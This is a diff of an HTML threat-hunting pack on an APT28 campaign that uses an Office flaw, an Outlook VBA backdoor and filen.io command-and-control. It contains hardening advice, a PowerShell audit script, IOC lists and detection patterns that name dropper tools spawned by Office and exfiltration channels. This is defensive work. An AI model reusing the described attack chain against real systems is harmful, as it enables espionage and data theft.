-        <strong>Full WDAC code integrity policy in audit-then-enforce mode</strong>. Only signed, approved binaries can run. This kills the OneDrive-from-ProgramData sideload pattern (and many other LOLBin techniques) structurally. High effort, very high payoff. Pilot on knowledge-worker tier first; servers second.
-        <span class="fw">MITRE M1045 · M1038</span>
-      </li>
-      <li>
-        <strong>CASB / SSE deployment with a cloud-storage governance policy</strong> (Netskope, Zscaler ZIA, Cisco Umbrella SIG, Cloudflare Gateway). Goes beyond per-domain blocking — gives visibility into which cloud-storage services are in actual use and lets you make a sanctioned-list decision based on data, not gut.
-        <span class="fw">MITRE M1021 · M1037 · M1057 (Data Loss Prevention)</span>
-      </li>
-      <li>
-        <strong>Phishing-resistant MFA (FIDO2 hardware keys)</strong> for any account with mailbox access to externally-facing inboxes. APT28's spear-phishing chain ends in credential theft for the next campaign; FIDO2 makes the stolen token useless.
-        <span class="fw">MITRE M1032</span>
-      </li>
-      <li>
-        <strong>Targeted phishing-resistant training program</strong> for users in APT28's target verticals (defense/transport/logistics roles). Standard awareness training tops out around 8–10% click rate; targeted role-based simulation gets it to 1–2%.
-        <span class="fw">MITRE M1017</span>
-      </li>
-      <li>
-        <strong>Outlook plugin allow-list policy</strong> via GPO — only signed, IT-approved Outlook plugins load. NotDoor's VbaProject.OTM isn't a plugin per se, but the same trust framework reduces the broader VBA + plugin attack surface.
-        <span class="fw">MITRE M1033 · M1045</span>
-      </li>
-    </ul>
-  </div>
-
-  <h3>Validation after deployment</h3>
-  <p>Spot-check 20 representative endpoints (mix of workstations and any Office-installed servers) for the Immediate-tier controls. Sample PowerShell:</p>
-  <div class="code-wrap">
-    <div class="code-actions">
-      <button class="btn" onclick="copyQuery(this)">Copy</button>
-    </div>
-<pre id="hardening-validate">$results = @{}
-
-# ASR rules: D4F940AB (Office child), 26190899 (Outlook comm child), 92E97FA1 (Win32 from macros),
-#            3B576869 (Office create exec), BE9BA2D9 (block exec from email)
-$wanted = @(
-  'D4F940AB-401B-4EFC-AADC-AD5F3C50688A',
-  '26190899-1602-49E8-8B27-EB1D0A1CE869',
-  '92E97FA1-2EDF-4476-BDD6-9DD0B4DDDC7B',
-  '3B576869-A4EC-4529-8536-B80A7769E899',
-  'BE9BA2D9-53EA-4CDC-84E5-9B1EEEE46550'
-)
-$pref = Get-MpPreference
-for ($i = 0; $i -lt $pref.AttackSurfaceReductionRules_Ids.Count; $i++) {
-  $id = $pref.AttackSurfaceReductionRules_Ids[$i]
-  $act = $pref.AttackSurfaceReductionRules_Actions[$i]  # 1 = Block, 2 = Audit, 6 = Warn
-  if ($wanted -contains $id) { $results["ASR_$id"] = $act }
-}
-
-# Outlook macro security (HKCU per-user — sample the logged-on user)
-$outlookVer = '16.0'  # adjust for your Office baseline
-$results['Outlook_MacroLevel'] = (Get-ItemProperty "HKCU:\Software\Microsoft\Office\$outlookVer\Outlook\Security" -Name Level -EA SilentlyContinue).Level
-
-# PSv2 disabled
-$results['PSv2_State'] = (Get-WindowsOptionalFeature -Online -FeatureName MicrosoftWindowsPowerShellV2).State
-
-# ScriptBlock logging
-$results['ScriptBlockLogging'] = (Get-ItemProperty 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging' -Name EnableScriptBlockLogging -EA SilentlyContinue).EnableScriptBlockLogging
-
-$results.GetEnumerator() | Sort-Object Name | ForEach-Object { "$($_.Name): $($_.Value)" }</pre>
-  </div>
-
-  <div class="callout">
-    <strong>Deploy via NinjaOne:</strong> The scripts above are raw PowerShell. To wrap them for fleet deployment with admin checks, error handling, and custom-field writeback for compliance tracking, hand them to the <code>ninjaone</code> skill. Suggested custom-field schema: <code>Hardening_APT28_ASR</code> (text), <code>Hardening_APT28_OutlookMacroLevel</code> (text), <code>Hardening_APT28_PSv2</code> (text), <code>Hardening_APT28_LastChecked</code> (date).
-  </div>
-</section>
-
-<!-- COVERAGE -->
-<section id="coverage">
-  <h2>Detection Coverage Map</h2>
-  <p>What this pack covers, what it doesn't, and where you should backstop with other telemetry.</p>
-  <table>
-    <tr><th>Stage</th><th>Technique</th><th>Coverage in this pack</th><th>Backstop</th></tr>
-    <tr><td>Initial Access</td><td>T1566.001 (spearphish attachment)</td><td><span class="cov-partial">PARTIAL</span> — Q8 catches detonation, not delivery</td><td>Defender for O365 / Proofpoint / Mimecast attachment scoring</td></tr>
-    <tr><td>Initial Access</td><td>T1203 (CVE-2026-21509)</td><td><span class="cov-good">GOOD</span> — Q8 + ASR rules</td><td>Falcon Spotlight vulnerability data showing unpatched Office</td></tr>
-    <tr><td>Execution</td><td>T1059.005 (VBA macro)</td><td><span class="cov-good">GOOD</span> — Q1, Q2, ASR rules</td><td>Office macro telemetry (audit-mode ASR Event ID 1122)</td></tr>
-    <tr><td>Execution</td><td>T1620 (reflective .NET)</td><td><span class="cov-partial">PARTIAL</span> — no direct query; CLM blocks it</td><td>Sysmon Event ID 7 (ImageLoad) on outlook.exe and winword.exe for .NET assemblies; Falcon AssemblyLoadEvent if licensed</td></tr>
-    <tr><td>Execution</td><td>T1027 (steganography)</td><td><span class="cov-gap">GAP</span> — no host-visible indicator pre-detonation</td><td>Mail-gateway sandbox extraction; YARA on inbound attachment images</td></tr>
-    <tr><td>Persistence</td><td>T1574.001 (DLL sideload)</td><td><span class="cov-good">GOOD</span> — Q3</td><td>Sysmon Event ID 7 with hash-mismatch on SSPICLI.dll</td></tr>
-    <tr><td>Persistence</td><td>T1137.005 (VBA macro store)</td><td><span class="cov-good">GOOD</span> — Q2 (highest fidelity)</td><td>(Q2 is the strongest signal — no backstop required)</td></tr>
-    <tr><td>Persistence</td><td>T1546.015 (COM hijacking)</td><td><span class="cov-gap">GAP</span></td><td>Sysmon Event ID 13 on HKCR/HKCU CLSID registry; Autoruns scheduled scan via NinjaOne</td></tr>
-    <tr><td>Persistence</td><td>T1053.005 (Scheduled Task)</td><td><span class="cov-gap">GAP</span></td><td>Windows Event ID 4698, taskscheduler audit policy</td></tr>
-    <tr><td>Defense Evasion</td><td>T1112 (registry tamper)</td><td><span class="cov-good">GOOD</span> — Q4</td><td>—</td></tr>
-    <tr><td>Defense Evasion</td><td>T1027.010 (encoded PS)</td><td><span class="cov-good">GOOD</span> — Q7</td><td>PowerShell ScriptBlock log (Event ID 4104)</td></tr>
-    <tr><td>C2</td><td>T1071.001 (HTTPS to filen.io)</td><td><span class="cov-good">GOOD</span> — Q5</td><td>NGFW / proxy logs with TLS inspection; CASB visibility</td></tr>
-    <tr><td>C2</td><td>T1568.002 (24 filen.io subdomains)</td><td><span class="cov-good">GOOD</span> — Q5 catches the domain family</td><td>Recursive DNS query logs</td></tr>
-    <tr><td>C2 (staging beacon)</td><td>T1102 (web service callback)</td><td><span class="cov-good">GOOD</span> — Q6</td><td>—</td></tr>
-    <tr><td>Exfiltration</td><td>T1567 (cloud storage)</td><td><span class="cov-partial">PARTIAL</span> — Q5 sees the channel</td><td>CASB / DLP egress monitoring; volume-based anomaly detection</td></tr>
-    <tr><td>Impact (variant)</td><td>T1485 (wiper)</td><td><span class="cov-gap">GAP</span> — separate hunt</td><td>Falcon ransomware/wiper IOA; Sysmon mass file-write events</td></tr>
-  </table>
-</section>
-
-<!-- TICKET -->
-<section id="ticket">
-  <h2>Hunt Summary Ticket</h2>
-  <p>Drop-in template for your hunt-tracking ticket (Jira, ServiceNow, Asana — works in any markdown-friendly system).</p>
-  <div class="code-wrap">
-    <div class="code-actions">
-      <button class="btn" onclick="copyQuery(this)">Copy</button>
-    </div>
-<pre id="ticket-md">## Hunt: APT28 PRISMEX / Operation Neusploit (CVE-2026-21509 + NotDoor + CovenantGrunt + filen.io C2)
-
-**Status:** Open
-**Hunt lead:** &lt;name&gt;
-**Opened:** 2026-05-16
-**Source intel:** Trend Micro PRISMEX (Apr 2026), Trellix (Feb 2026), Zscaler Operation Neusploit (Jan 2026), Splunk Threat Research NotDoor (Nov 2025)
-
-### Why hunt now
-APT28 weaponized CVE-2026-21509 within 24 hours of disclosure and abuses legitimate filen.io cloud storage as C2,
-bypassing reputation-based filtering. Active across EU defense / Ukraine / NATO partner verticals. Some incidents
-include a destructive wiper component.
-
-### Hypothesis
-1. outlook.exe parent → VBA / WScript / mshta / PowerShell child (NotDoor execution stage)
-2. Any process making outbound TLS to *.filen.io subdomains (PrismexStager C2)
-3. Reflective .NET assembly loaded from Outlook context (CovenantGrunt tasking)
-Plus persistence indicators:
-4. VbaProject.OTM written by non-OUTLOOK.EXE process
-5. OneDrive.exe running from C:\ProgramData\ (sideload tell)
-
-### Prioritization (do-first)
-1. [ ] **Q2** — VbaProject.OTM file writes by non-Outlook (last 30 days)
-2. [ ] **Q1** — outlook.exe → script interpreter children (last 14 days)
-3. [ ] **Q5** — *.filen.io DNS from non-browser processes (last 30 days)
-4. [ ] **Q3** — OneDrive.exe in C:\ProgramData (last 30 days)
-5. [ ] **Q6** — dnshook.site / webhook.site beacon (last 30 days)
-6. [ ] **Q7** — Encoded PowerShell parented to OneDrive.exe (last 30 days)
-7. [ ] **Q4** — Outlook macro security registry tampering (last 14 days)
-8. [ ] **Q8** — Office (winword/excel) spawning child (last 14 days)
-
-### Expected findings (what a real positive looks like)
-- Q2 / Q3: zero results in a clean fleet; any result needs immediate triage and host isolation
-- Q1 / Q7: handful of FPs from legitimate signed-publisher Outlook add-ins or admin scripts — triage and allow-list
-- Q5: depends on filen.io use in your environment; non-browser source is the suspicious signal
-- Q4: GPO/Intune rollouts will surface — exclude documented service contexts
-
-### Risk classification
-- **Pre-detect (no hits):** HIGH — chain is active and rapid; controls in §7 should be in flight regardless
-- **Q2 hit (VbaProject.OTM):** CRITICAL — isolate host, collect SSPICLI.dll/testtemp.ini for analysis, rotate credentials
-- **Q5 hit (non-browser → filen.io):** HIGH — likely CovenantGrunt stager, isolate and collect process memory
-
-### Follow-up
-- [ ] Deploy Tier 1 hardening from §7 (ASR rules, Office patch verification, Outlook macro security)
-- [ ] Push Falcon IOC pack from §5 to Prevent mode after 7d audit
-- [ ] Promote IOAs from §6 to Block mode after 14d validation
-- [ ] Schedule Tier 2 controls for the next sprint (Defender for O365, CASB / SSE)
-- [ ] Document Tier 3 structural project (VBA disablement, WDAC) on the roadmap
-- [ ] Re-run this pack monthly for the next 6 months</pre>
-  </div>
-</section>
-
-<!-- REFERENCES -->
-<section id="refs">
-  <h2>References</h2>
-  <ul>
-    <li><a href="https://www.trellix.com/blogs/research/apt28-stealthy-campaign-leveraging-cve-2026-21509-cloud-c2/" target="_blank" rel="noopener">Trellix — APT28's Stealthy Multi-Stage Campaign Leveraging CVE-2026-21509 and Cloud C2 Infrastructure (Feb 4, 2026)</a></li>
-    <li><a href="https://thehackernews.com/2026/04/apt28-deploys-prismex-malware-in.html" target="_blank" rel="noopener">The Hacker News — APT28 Deploys PRISMEX Malware in Campaign Targeting Ukraine and NATO Allies (Apr 8, 2026)</a></li>
-    <li><a href="https://www.zscaler.com/blogs/security-research/apt28-leverages-cve-2026-21509-operation-neusploit" target="_blank" rel="noopener">Zscaler ThreatLabz — Operation Neusploit: APT28 Uses CVE-2026-21509</a></li>
-    <li><a href="https://www.splunk.com/en_us/blog/security/notdoor-insights-a-closer-look-at-outlook-macros-and-more.html" target="_blank" rel="noopener">Splunk Threat Research — NotDoor Insights: A Closer Look at Outlook Macros and More (Nov 14, 2025)</a></li>
-    <li><a href="https://thehackernews.com/2026/02/apt28-uses-microsoft-office-cve-2026.html" target="_blank" rel="noopener">The Hacker News — APT28 Uses Microsoft Office CVE-2026-21509 in Espionage-Focused Malware Attacks (Feb 2026)</a></li>
-    <li><a href="https://socprime.com/active-threats/uac-0001-apt28-attacks-using-cve-2026-21509/" target="_blank" rel="noopener">SOC Prime — CVE-2026-21509 Exploited by APT28 via WebDAV and COM</a></li>
-    <li><a href="https://www.darkreading.com/endpoint-security/apt28-outlook-notdoor-backdoor" target="_blank" rel="noopener">Dark Reading — APT28 Targets Microsoft Outlook With 'NotDoor' Malware</a></li>
-    <li><a href="https://attack.mitre.org/groups/G0007/" target="_blank" rel="noopener">MITRE ATT&amp;CK — Group APT28 (G0007)</a></li>
-    <li><a href="https://learn.microsoft.com/en-us/defender-endpoint/attack-surface-reduction-rules-reference" target="_blank" rel="noopener">Microsoft Defender — Attack Surface Reduction rules reference</a></li>
-    <li><a href="https://msrc.microsoft.com/" target="_blank" rel="noopener">Microsoft Security Response Center — CVE-2026-21509 advisory and patch guidance</a></li>
-  </ul>
-</section>
-
 </div>
 
-<footer>
-  Generated 2026-05-16 by hunt-cycle skills (<code>threat-hunter</code> + <code>crowdstrike-logscale</code> + <code>threat-hardening</code>).
-  Detection content is offered as a hunt starting point — validate FP rates in your environment before promoting to Prevent mode.
-</footer>
+<div class="section" id="s8">
+  <div class="section-hdr"><span class="snum">08</span><h2>CrowdStrike Custom IOA Recommendations</h2></div>
+  <div class="section-body">
+    <table>
+      <thead><tr><th>IOA Name</th><th>Field Patterns</th><th>Benign Exclusions</th><th>Deployment Path</th></tr></thead>
+      <tbody>
+        <tr><td>APT28 — Office spawns dropper</td><td>Parent <code>*\winword.exe</code>; Child <code>cmd/powershell/mshta/rundll32/certutil.exe</code></td><td>Sanctioned macro/automation (allow-list)</td><td>Endpoint Security → Custom IOA → Process Creation, Detect+Block</td></tr>
+        <tr><td>APT28 — Outlook VBA persistence</td><td>Write to <code>*\Outlook\VbaProject.OTM</code> or LoadMacroProviderOnBoot</td><td>Sanctioned Outlook macros (rare)</td><td>Custom IOA → File Write / registry</td></tr>
+      </tbody>
+    </table>
+    <div class="callout callout-info">Q1 is a strong promotion (Office→dropper). Q3 (Outlook persistence) is high-value where Outlook VBA is unused. Q4/Q5 stay tuned hunts (Covenant is generic).</div>
+  </div>
+</div>
+
+<div class="section" id="s9">
+  <div class="section-hdr"><span class="snum">09</span><h2>Machine-Readable IOC Appendix</h2></div>
+  <div class="section-body">
+    <h3 style="margin:0 0 4px;">Grouped IOC Quick-Copy</h3>
+    <p style="font-size:11px;color:var(--text-muted);margin:0 0 6px;">One-click blocks for detection and patch audit. The patch is the fix; payloads/infra rotate — behavior is durable. Add per-incident atoms during triage.</p>
+    <div class="ioc-grab-grid">
+
+      <div class="ioc-grab">
+        <div class="igh"><span class="igt">Behavioral Signatures</span><span class="igc">detection logic</span></div>
+        <button class="btn-copy" data-label="Copy behaviors" onclick="copyBlock('grab-behav',this)" style="margin:0 0 6px;">Copy behaviors</button>
+<pre class="code" id="grab-behav">winword.exe spawning cmd/powershell/mshta/rundll32/certutil (RTF exploit outcome)
+PE/DLL written to %TEMP%/%AppData% by an Office-spawned process (PixyNetLoader/MiniDoor)
+Outlook VBA persistence: VbaProject.OTM write / LoadMacroProviderOnBoot (MiniDoor = NotDoor variant)
+rundll32/regsvr32 loading a temp DLL, or GruntStager/csc.exe compiling from %TEMP% (Covenant)
+DNS/connection to filen.io from a non-sanctioned process (staging/exfil)
+Vulnerable Office build predating the 26 Jan 2026 OOB fix</pre>
+      </div>
+
+      <div class="ioc-grab">
+        <div class="igh"><span class="igt">Named Tooling / Attribution</span><span class="igc">APT28</span></div>
+        <button class="btn-copy" data-label="Copy names" onclick="copyBlock('grab-names',this)" style="margin:0 0 6px;">Copy names</button>
+<pre class="code" id="grab-names">MiniDoor      # Outlook email stealer (stripped variant of NotDoor; APT28-linked)
+NotDoor       # APT28 Outlook backdoor (parent of MiniDoor)
+PixyNetLoader # the "PRISMEX" loader -> stages the implant
+Covenant Grunt# public C2-framework implant used for hands-on control
+# Actor: APT28 / Fancy Bear (Russia GRU). Campaign: Operation Neusploit.
+# Targeting: Central/Eastern European + Ukrainian government (CERT-UA: 60+ addresses)</pre>
+      </div>
+
+      <div class="ioc-grab">
+        <div class="igh"><span class="igt">Patch / Exposure Audit</span><span class="igc">the fix</span></div>
+        <button class="btn-copy" data-label="Copy patch" onclick="copyBlock('grab-cve',this)" style="margin:0 0 6px;">Copy patch</button>
+<pre class="code" id="grab-cve">CVE-2026-21509   # Microsoft Office RTF security-feature-bypass (APT28 zero-day)
+# Out-of-band fix released 26 Jan 2026. Affects:
+#   Office 2016, Office 2019, Office LTSC 2021, Office LTSC 2024, M365 Apps for Enterprise
+# Verify Office build vs the OOB patched build for your channel; force-update laggards.
+# Defense-in-depth: block RTF at the mail gateway; disable legacy RTF where possible.</pre>
+      </div>
+
+      <div class="ioc-grab">
+        <div class="igh"><span class="igt">Hardening / Block</span><span class="igc">defense-in-depth</span></div>
+        <button class="btn-copy" data-label="Copy controls" onclick="copyBlock('grab-ctrl',this)" style="margin:0 0 6px;">Copy controls</button>
+<pre class="code" id="grab-ctrl">Patch CVE-2026-21509 (26 Jan 2026 OOB) fleet-wide — the fix
+Block/strip RTF + macro-enabled Office attachments at the mail gateway
+ASR: block Office apps from creating child processes; block executable content from email
+Disable Outlook VBA / macros (GPO) unless explicitly required
+Egress: alert on filen.io from non-sanctioned processes; tune Covenant C2 detection
+CEE/Ukraine-gov orgs: elevated monitoring + threat-intel feeds</pre>
+      </div>
+
+    </div>
+  </div>
+</div>
+
+<div class="section" id="s10">
+  <div class="section-hdr"><span class="snum">10</span><h2>Hardening — Tiered &amp; Deployable</h2></div>
+  <div class="section-body">
+    <p>Patch the Office flaw, cut RTF/macro delivery, and constrain Office child processes.</p>
+    <div class="tier-blk tier-imm">
+      <div class="tier-lbl">Immediate — Patch &amp; cut delivery</div>
+      <ul>
+        <li><strong>Patch CVE-2026-21509 (26 Jan 2026 OOB) fleet-wide</strong> — <em>M1051</em>. The fix. Inventory laggards (Q6/N2).</li>
+        <li><strong>Block/strip RTF + macro-enabled Office attachments at the gateway</strong> — <em>M1021</em>. Cuts delivery.</li>
+        <li><strong>ASR: block Office apps from creating child processes; block executable content from email</strong> — <em>M1042</em>. Breaks the exploit chain (Q1).</li>
+        <li><strong>Disable Outlook VBA / macros via GPO</strong> — <em>M1042</em>. Neuters MiniDoor persistence (Q3).</li>
+      </ul>
+    </div>
+    <div class="tier-blk tier-near">
+      <div class="tier-lbl">Near term — Constrain &amp; observe (pilot first)</div>
+      <ul>
+        <li><strong>PowerShell CLM + script-block logging; WDAC for LOLBins</strong> — <em>M1038 / M1040</em>. Blunts the dropper/loader.</li>
+        <li><strong>Egress control: alert on filen.io + tune Covenant C2 detection</strong> — <em>M1037</em>.</li>
+        <li><strong>Protected Outlook config; monitor VbaProject.OTM</strong> — <em>M1018</em>. Feeds Q3/N3.</li>
+      </ul>
+    </div>
+    <div class="tier-blk tier-strat">
+      <div class="tier-lbl">Strategic — Reduce espionage surface</div>
+      <ul>
+        <li><strong>Application allowlisting; default-deny LOLBin abuse</strong> — <em>M1038</em>.</li>
+        <li><strong>Phishing-resistant MFA; high-value-user protections</strong> — <em>M1032</em>. Gov/exec targeting.</li>
+        <li><strong>Elevated monitoring for CEE/Ukraine-gov orgs + APT28 threat intel</strong> — <em>M1047</em>.</li>
+      </ul>
+    </div>
+  </div>
+</div>
+
+<div class="section" id="s11">
+  <div class="section-hdr"><span class="snum">11</span><h2>Containment Runbook</h2></div>
+  <div class="section-body">
+    <table>
+      <thead><tr><th>Phase</th><th>Actions</th><th>Owner</th><th>Evidence</th></tr></thead>
+      <tbody>
+        <tr><td>Isolate</td><td>Network-contain the host; preserve the RTF + dropped payloads + Outlook VBA project</td><td>SOC L2</td><td>Containment timestamp; Q1 event; RTF</td></tr>
+        <tr><td>Triage</td><td>Map RTF → dropper → MiniDoor/PixyNetLoader → Covenant timeline; assess mailbox theft; find C2/filen.io</td><td>IR</td><td>Process tree; mailbox review; C2</td></tr>
+        <tr><td>Eradicate</td><td>Remove MiniDoor (Outlook VBA) + loader + Covenant Grunt; block C2; reset credentials used on the host</td><td>IR</td><td>Removal log; cred reset</td></tr>
+        <tr><td>Recover</td><td>Rebuild if hands-on Covenant access occurred; rotate creds; review exfiltrated email/data scope</td><td>IR + IT</td><td>Rebuild ticket; exfil scope</td></tr>
+        <tr><td>Harden</td><td>Patch CVE-2026-21509; block RTF/macros; ASR; promote Q1/Q3 IOAs</td><td>Detection Eng</td><td>Patch coverage; IOA enabled</td></tr>
+      </tbody>
+    </table>
+  </div>
+</div>
+
+<div class="section" id="s12">
+  <div class="section-hdr"><span class="snum">12</span><h2>Detection Coverage Map &amp; Validation</h2></div>
+  <div class="section-body">
+    <table>
+      <thead><tr><th>Technique</th><th>Behavior</th><th>CQL</th><th>IOA</th><th>Coverage</th></tr></thead>
+      <tbody>
+        <tr><td>T1203</td><td>RTF exploit (Office→dropper)</td><td>Q1, Q6</td><td>IOA-1</td><td><span class="badge b-low">Good</span> + patch</td></tr>
+        <tr><td>T1105 / T1574</td><td>Loader drop</td><td>Q2</td><td>—</td><td><span class="badge b-med">Partial</span> correlate to Q1</td></tr>
+        <tr><td>T1137 / T1114</td><td>MiniDoor Outlook stealer</td><td>Q3</td><td>IOA-2</td><td><span class="badge b-low">Good</span> where VBA unused</td></tr>
+        <tr><td>T1574 / T1071.001</td><td>PixyNetLoader → Covenant</td><td>Q4</td><td>—</td><td><span class="badge b-med">Partial</span> Covenant generic</td></tr>
+        <tr><td>T1071.001 / T1567.002</td><td>C2 / filen.io exfil</td><td>Q5</td><td>—</td><td><span class="badge b-med">Partial</span> + proxy (N4)</td></tr>
+        <tr><td>T1566.001</td><td>Phishing RTF delivery</td><td>—</td><td>—</td><td><span class="badge b-high">GAP</span> mail gateway (N1)</td></tr>
+      </tbody>
+    </table>
+    <p style="margin-top:8px;"><strong>Validation gates:</strong> (1) confirm process + (ideally) Outlook VBA/registry + proxy telemetry; (2) baseline any sanctioned Office macros / filen.io use; (3) lab-test a benign <code>winword → cmd</code> (Q1) and a benign <code>VbaProject.OTM</code> write (Q3); (4) patch CVE-2026-21509 + promote Q1/Q3; keep Q2/Q4/Q5 correlated. CEE/Ukraine-gov: elevated priority.</p>
+  </div>
+</div>
+
+<div class="section" id="s13">
+  <div class="section-hdr"><span class="snum">13</span><h2>Hunt Summary Ticket</h2></div>
+  <div class="section-body">
+    <div class="ticket">
+<pre class="code" id="ticket-block" style="margin:0;border:none;background:transparent;">TITLE:        Hunt — APT28 PRISMEX / Operation Neusploit (CVE-2026-21509)
+SEVERITY:     Critical (nation-state espionage; exploited Office zero-day)
+SCOPE:        Office endpoints (RTF); high-value/government users; CEE/Ukraine elevated
+HYPOTHESIS:   Phishing RTF (CVE-2026-21509) -> dropper -> MiniDoor (Outlook stealer, NotDoor
+              variant) + PixyNetLoader -> Covenant Grunt -> hands-on espionage / filen.io exfil.
+QUERIES RUN:  Q1 Office-&gt;dropper (IOA) | Q2 loader drop | Q3 MiniDoor Outlook persistence (IOA) |
+              Q4 PixyNetLoader-&gt;Covenant | Q5 filen.io/Covenant C2 | Q6 vulnerable Office build
+              + Native N1-N4 (phishing RTF, Office patch, Outlook persistence, C2/filen.io)
+DO FIRST:     Patch CVE-2026-21509; then Q1, Q3 — escalate any hit (nation-state)
+FINDINGS:     &lt;pending analyst execution&gt;
+GAPS:         Phishing delivery (mail gw); Covenant is a generic framework (tune)
+ACTIONS:      Patch OOB fix; block RTF/macros; ASR (Office child processes); disable Outlook VBA;
+              promote Q1/Q3; elevated monitoring for CEE/Ukraine-gov
+OWNER:        HuntPack
+VERSION:      v0.3 - 2026-06-12</pre>
+    </div>
+  </div>
+</div>
+
+<div class="section" id="s14">
+  <div class="section-hdr"><span class="snum">14</span><h2>Changelog</h2></div>
+  <div class="section-body">
+    <div class="chg-entry"><span class="chg-ver">v0.3</span><span class="chg-date">2026-06-12</span><span>Re-hunt + reformatted to the review-v2 gold layout (fixed left-sidebar scrollspy TOC, collapsible, cloud selector inside the CQL section, per-card Copy/Open-in-Falcon, Grouped IOC Quick-Copy grid, coverage+validation, .ticket). Refreshed from Zscaler/Picus/CERT-UA: Operation Neusploit attribution, CVE-2026-21509 RTF SFB + 26 Jan 2026 OOB patch + affected Office versions, MiniDoor (NotDoor variant) Outlook stealer, PixyNetLoader → Covenant Grunt, filen.io exfil, CEE/Ukraine-gov targeting. 6 CQL + 4 native hunts, 2 IOA candidates.</span></div>
+    <div class="chg-entry"><span class="chg-ver">v0.1</span><span class="chg-date">2026-05-26</span><span>Initial pack: APT28 PRISMEX / Operation Neusploit overview + hunts. Pre-gold top-bar layout.</span></div>
+  </div>
+</div>
+
+<div class="section" id="s15">
+  <div class="section-hdr"><span class="snum">15</span><h2>References</h2></div>
+  <div class="section-body">
+    <table>
+      <thead><tr><th>Tier</th><th>Source</th><th>Used For</th></tr></thead>
+      <tbody>
+        <tr><td>1</td><td><a href="https://www.zscaler.com/blogs/security-research/apt28-leverages-cve-2026-21509-operation-neusploit" target="_blank">Zscaler ThreatLabz — Operation Neusploit</a></td><td>APT28 attribution, payload chain, targeting</td></tr>
+        <tr><td>1</td><td><a href="https://www.picussecurity.com/resource/blog/cve-2026-21509-apt28-exploits-microsoft-office-zero-day-vulnerability" target="_blank">Picus — CVE-2026-21509 (APT28 Office zero-day)</a></td><td>RTF SFB mechanism, OOB patch, affected versions</td></tr>
+        <tr><td>1</td><td><a href="https://thehackernews.com/2026/02/apt28-uses-microsoft-office-cve-2026.html" target="_blank">The Hacker News — APT28 uses Office CVE-2026-21509</a></td><td>MiniDoor=NotDoor variant; PixyNetLoader; Covenant Grunt; CERT-UA</td></tr>
+        <tr><td>2</td><td><a href="https://hivepro.com/threat-advisory/operation-neusploit-apt28-weaponizes-cve-2026-21509/" target="_blank">Hive Pro — Operation Neusploit</a> · <a href="https://securityaffairs.com/187581/apt/apt28-exploits-microsoft-office-flaw-in-operation-neusploit.html" target="_blank">Security Affairs</a></td><td>Advisory; espionage focus; chain</td></tr>
+      </tbody>
+    </table>
+    <p style="margin-top:12px;font-size:11px;color:var(--text-muted);">HuntPack v0.3 · APT28 PRISMEX / Operation Neusploit · Generated 2026-06-12 · Defensive use only — no offensive code. Patch CVE-2026-21509 (the fix); behavioral hunts cover the Office-RTF lineage, MiniDoor Outlook theft, and the loader→Covenant chain. Covenant is a public framework — tune to your environment. Validate field names before promoting any query.</p>
+  </div>
+</div>
+
+</div><!-- /main -->
 
 <script>
-  // === Cloud switching ===
-  const STORAGE_KEY = "apt28_prismex_hunt_falcon_cloud";
-  const select = document.getElementById("cloudSelect");
-  const currentHost = document.getElementById("currentHost");
-
-  function updateCloud() {
-    const host = select.value;
-    currentHost.textContent = host;
-    try { localStorage.setItem(STORAGE_KEY, host); } catch (e) {}
-    rebuildFalconLinks(host);
-  }
-
-  function rebuildFalconLinks(host) {
-    document.querySelectorAll("a.open-falcon").forEach(a => {
-      const qid = a.getAttribute("data-query-id");
-      const queryEl = document.getElementById(qid);
-      if (!queryEl) return;
-      const raw = queryEl.innerText || queryEl.textContent || "";
-      const encoded = encodeURIComponent(raw);
-      a.href = host + "/investigate/search?query=" + encoded;
-    });
-  }
-
-  try {
-    const saved = localStorage.getItem(STORAGE_KEY);
-    if (saved) {
-      for (let i = 0; i < select.options.length; i++) {
-        if (select.options[i].value === saved) { select.selectedIndex = i; break; }
-      }
+function toggleToc() {
+  document.body.classList.toggle('toc-collapsed');
+  if (window.matchMedia('(max-width: 768px)').matches) { document.body.classList.toggle('toc-shown'); }
+}
+function copyQuery(id, btn) {
+  var pre = document.getElementById(id);
+  var text = pre ? pre.innerText : '';
+  navigator.clipboard.writeText(text).then(function () {
+    btn.textContent = 'Copied!'; btn.classList.add('copied');
+    setTimeout(function () { btn.textContent = 'Copy CQL'; btn.classList.remove('copied'); }, 2000);
+  }).catch(function () {
+    var ta = document.createElement('textarea'); ta.value = text; document.body.appendChild(ta); ta.select();
+    document.execCommand('copy'); document.body.removeChild(ta);
+    btn.textContent = 'Copied!'; btn.classList.add('copied');
+    setTimeout(function () { btn.textContent = 'Copy CQL'; btn.classList.remove('copied'); }, 2000);
+  });
+}
+function copyBlock(id, btn) {
+  var pre = document.getElementById(id);
+  var text = pre ? pre.innerText : '';
+  var label = btn.getAttribute('data-label') || 'Copy';
+  function done() { btn.textContent = 'Copied!'; btn.classList.add('copied'); setTimeout(function () { btn.textContent = label; btn.classList.remove('copied'); }, 2000); }
+  navigator.clipboard.writeText(text).then(done).catch(function () {
+    var ta = document.createElement('textarea'); ta.value = text; document.body.appendChild(ta); ta.select(); document.execCommand('copy'); document.body.removeChild(ta); done();
+  });
+}
+function openFalcon(id) {
+  var region = document.getElementById('cloud-region').value;
+  var pre = document.getElementById(id);
+  if (!pre || !region) return;
+  var cleaned = pre.innerText.split('\n').filter(function (line) { return line.trim().indexOf('//') !== 0; }).join('\n').trim();
+  var url = region + '/investigate/search?repo=all&start=7d&end=&searchViewInteractions=NoXSA&timezone=UTC&query=' + encodeURIComponent(cleaned);
+  window.open(url, '_blank');
+}
+var sections = document.querySelectorAll('.section');
+window.addEventListener('scroll', function () {
+  var scrollY = window.scrollY + 60;
+  sections.forEach(function (sec) {
+    if (scrollY >= sec.offsetTop) {
+      document.querySelectorAll('#sidebar nav a').forEach(function (a) { a.classList.remove('active'); });
+      var link = document.querySelector('#sidebar nav a[href="#' + sec.getAttribute('id') + '"]');
+      if (link) link.classList.add('active');
     }
-  } catch (e) {}
-  updateCloud();
-
-  // === Copy buttons ===
-  function copyQuery(btn) {
-    const wrap = btn.closest(".code-wrap");
-    if (!wrap) return;
-    const pre = wrap.querySelector("pre");
-    if (!pre) return;
-    const text = pre.innerText || pre.textContent || "";
-    const fallback = () => {
-      const ta = document.createElement("textarea");
-      ta.value = text;
-      ta.style.position = "fixed";
-      ta.style.opacity = "0";
-      document.body.appendChild(ta);
-      ta.select();
-      try { document.execCommand("copy"); } catch (e) {}
-      document.body.removeChild(ta);
-    };
-    if (navigator.clipboard && navigator.clipboard.writeText) {
-      navigator.clipboard.writeText(text).catch(fallback);
-    } else {
-      fallback();
-    }
